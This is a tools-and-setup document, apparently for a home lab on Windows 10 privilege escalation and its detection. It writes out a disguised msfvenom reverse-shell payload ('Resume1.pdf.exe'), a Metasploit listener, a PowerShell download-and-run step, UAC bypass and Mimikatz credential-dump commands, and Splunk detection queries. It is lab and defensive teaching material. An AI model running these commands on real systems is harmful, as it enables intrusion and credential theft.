# Tools & Requirements

This document outlines all tools, software, and infrastructure used in the Windows 10 privilege escalation lab, including installation instructions and version information.

---

## Lab Environment

### Hypervisor
- **VirtualBox** (or equivalent: VMware, Hyper-V, KVM)
- **Network:** Isolated internal network (no external internet access) to prevent accidental lateral movement or data exfiltration

### Attack Machine
- **Operating System:** Kali Linux (latest, or 2023.x+)
- **Architecture:** 64-bit
- **RAM:** 4 GB minimum (8 GB recommended)
- **Disk:** 40 GB

### Target Machine
- **Operating System:** Windows 10 (Build 19045 or similar)
- **Architecture:** 64-bit
- **RAM:** 4 GB minimum
- **Disk:** 50 GB
- **User Account:** Local administrator (non-SYSTEM)
- **UAC:** Enabled at default setting

### SIEM / Detection Infrastructure
- **Splunk Enterprise** (latest, or 9.0.x+)
- **Sysmon** (v14.x or higher)
- **Windows Event Log forwarding** enabled on target

---

## Offensive Tools (Attacker Side)

### 1. Nmap (Network Mapper)

**Purpose:** Port scanning and OS/service enumeration

**Version:** 7.92+

**Installation (Kali Linux):**
```bash
sudo apt update
sudo apt install nmap
```

**Verification:**
```bash
nmap --version
```

**Usage in lab:**
```bash
nmap -A -Pn 192.168.20.10
```

**Reference:** https://nmap.org/

---

### 2. Metasploit Framework

**Purpose:** Exploit development, payload generation, and command-and-control framework

**Version:** 6.2+

**Pre-installed on Kali Linux** — verify with:
```bash
msfconsole --version
```

**If not installed:**
```bash
sudo apt install metasploit-framework
```

**Key Modules Used:**
- `msfvenom` — payload generator (creates `Resume1.pdf.exe`)
- `exploit/multi/handler` — C2 listener for reverse shells
- `exploit/windows/local/bypassuac_windows_store_reg` — UAC bypass via registry manipulation
- `post/windows/gather/credentials/credential_collector` — credential enumeration

**Usage in lab:**
```bash
# Payload generation
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.20 lport=4444 -f exe -o Resume1.pdf.exe

# C2 handler
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.20.20
exploit
```

**Reference:** https://www.metasploit.com/

---

### 3. Python 3

**Purpose:** Quick HTTP server for payload delivery simulation

**Version:** 3.8+

**Installation (Kali Linux):**
```bash
sudo apt install python3
```

**Verification:**
```bash
python3 --version
```

**Usage in lab:**
```bash
python3 -m http.server 9999
```

**Reference:** https://www.python.org/

---

## Post-Exploitation Tools (Attacker Side)

### 4. Mimikatz / Kiwi (Meterpreter Extension)

**Purpose:** Credential dumping and Windows authentication material extraction

**Version:** Kiwi (Meterpreter's Mimikatz wrapper) — included with Metasploit

**How used in lab:**
- Loaded via Meterpreter: `load kiwi`
- Commands: `lsa_dump_sam`, `creds_all`, `kerberos_dump`

**Note:** Mimikatz itself is also available standalone at https://github.com/gentilkiwi/mimikatz, but the Kiwi Meterpreter extension was used here for integration.

**Why:** SYSTEM-level access is required to read the SAM database and LSA secrets; this tool automates that extraction process.

**Reference:** https://github.com/gentilkiwi/mimikatz

---

## Defensive Tools (Detection Side)

### 5. Sysmon (System Monitoring)

**Purpose:** Deep kernel-level logging of system activity (process creation, network connections, registry modifications, etc.)

**Version:** 14.0+

**Installation (on Windows target):**
1. Download from: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
2. Extract `Sysmon.exe` and a config file (e.g., `sysmon-config.xml`)
3. Install:
   ```cmd
   Sysmon.exe -i sysmon-config.xml
   ```
4. Verify:
   ```cmd
   Get-Service Sysmon | Status
   ```

**Event IDs captured in lab:**
- **Event ID 1:** Process creation (Resume1.pdf.exe → cmd.exe)
- **Event ID 10:** Process access (credential dumping to LSASS)
- **Event ID 13:** Registry modification (UAC bypass registry key)

**Forwarding to Splunk:**
Configure Windows Event Forwarding or Splunk Universal Forwarder to send Sysmon logs to Splunk.

**Reference:** https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon

---

### 6. Splunk Enterprise

**Purpose:** SIEM (Security Information and Event Management) — centralized logging, searching, and forensic analysis

**Version:** 9.0+

**Installation:**
1. Download from: https://www.splunk.com/en_us/download/splunk-enterprise.html
2. On Kali or dedicated Linux VM:
   ```bash
   wget https://download.splunk.com/products/splunk/releases/9.x/linux/splunk-9.x-xxxxxxxx-Linux-x86_64.tgz
   tar -xzf splunk-*.tgz -C /opt
   cd /opt/splunk
   bin/splunk start --accept-license
   ```
3. Access: `http://localhost:8000` (default)

**Configuration for lab:**
- Create index: `endpoint`
- Configure data input: Add Windows Event Log source (Sysmon events)
- Set up Splunk Universal Forwarder on Windows target to ship logs

**Usage in lab:**
```spl
index=endpoint ParentProcessGuid="{219c8ea3-97df-6a50-a41a-00000000500}" EventCode=1
```

**Reference:** https://www.splunk.com/

---

### 7. Windows Event Log

**Purpose:** Native Windows logging of system and security events

**Version:** Built-in (Windows 10+)

**How used in lab:**
- Sysmon events logged to Windows Event Viewer (`Event Viewer → Applications and Services Logs → Microsoft-Windows-Sysmon/Operational`)
- Forwarded to Splunk via Splunk Universal Forwarder or Windows Event Forwarding

**Reference:** https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging

---

## Optional Tools (For Enhanced Detection)

### 8. Splunk Universal Forwarder

**Purpose:** Lightweight Splunk agent for shipping logs from the Windows target to the Splunk indexer

**Installation:**
1. Download: https://www.splunk.com/en_us/download/universal-forwarder.html
2. Install on Windows target
3. Configure to forward Sysmon logs to Splunk indexer

---

### 9. osquery (Optional)

**Purpose:** Alternative to Sysmon for system monitoring and EDR simulation

**Installation:**
```bash
# On Windows target
choco install osquery
```

**Reference:** https://osquery.io/

---

## Lab Setup Checklist

- [ ] VirtualBox with isolated network configured
- [ ] Kali Linux VM created and updated (`sudo apt update && sudo apt upgrade`)
- [ ] Windows 10 VM created with admin user account
- [ ] Metasploit Framework installed and updated on Kali
- [ ] Python 3 available on Kali
- [ ] Sysmon installed on Windows target
- [ ] Splunk Enterprise running (on Kali or dedicated Linux VM)
- [ ] Sysmon logs forwarded to Splunk via Universal Forwarder or Event Forwarding
- [ ] Splunk `endpoint` index created and receiving data
- [ ] Network connectivity verified between VMs (ping tests, no external routes)

---

## Version Compatibility

| Tool | Version Used | Min Version | Tested OS |
|------|--------------|-------------|-----------|
| Nmap | 7.92 | 7.80+ | Kali Linux |
| Metasploit Framework | 6.2+ | 6.0+ | Kali Linux |
| Meterpreter (64-bit) | 4.x | 4.0+ | Windows 10 x64 |
| Python | 3.9+ | 3.8+ | Kali Linux |
| Mimikatz | 2.2.x | 2.1+ | Windows 10 |
| Sysmon | 14.13 | 14.0+ | Windows 10 |
| Splunk Enterprise | 9.0.3 | 8.2+ | Linux / Windows |

---

## Command Reference

### Quick Start (One-Liner Summary)

**On Attacker (Kali):**
```bash
# Reconnaissance
nmap -A -Pn 192.168.20.10

# Payload generation
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.20 lport=4444 -f exe -o Resume1.pdf.exe

# Host payload
python3 -m http.server 9999

# Start handler
msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.20.20; exploit"
```

**On Target (Windows 10):**
```cmd
# Download payload from attacker
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.20.20:9999/Resume1.pdf.exe', 'Resume1.pdf.exe')"

# Execute payload (triggers reverse shell)
Resume1.pdf.exe
```

**In Splunk (Detection):**
```spl
index=endpoint EventCode=1 Image="*Resume1.pdf.exe*"
index=endpoint EventCode=10 TargetImage="*lsass.exe*"
index=endpoint EventCode=13 TargetObject="*CurrentControlSet*"
```

---

## Troubleshooting

### Meterpreter Session Won't Open
- Verify firewall allows port 4444 between VMs
- Check target can reach attacker IP: `ping 192.168.20.20`
- Ensure Windows Defender isn't blocking the payload

### Sysmon Events Not Appearing
- Verify Sysmon service is running: `Get-Service Sysmon`
- Check Event Viewer for Sysmon events: `Applications and Services Logs → Microsoft-Windows-Sysmon → Operational`
- Restart Splunk forwarder if logs aren't flowing

### Splunk Can't Connect to Windows Target
- Verify Universal Forwarder is running on target
- Check firewall allows port 9997 (default Splunk indexer port)
- Review `splunkd.log` on forwarder for connection errors

---

## References & Further Reading

- **Metasploit:** https://docs.rapid7.com/metasploit/
- **Mimikatz:** https://github.com/gentilkiwi/mimikatz
- **Sysmon:** https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
- **Splunk:** https://docs.splunk.com/
- **MITRE ATT&CK:** https://attack.mitre.org/ (map attack techniques)
- **OWASP Top 10:** https://owasp.org/www-project-top-ten/

---

## License & Legal

All tools listed here are publicly available and legitimate security research utilities. Use responsibly and only in authorized lab environments. Unauthorized access to computer systems is illegal.

**Lab performed on:** Isolated home lab network, no external systems targeted.
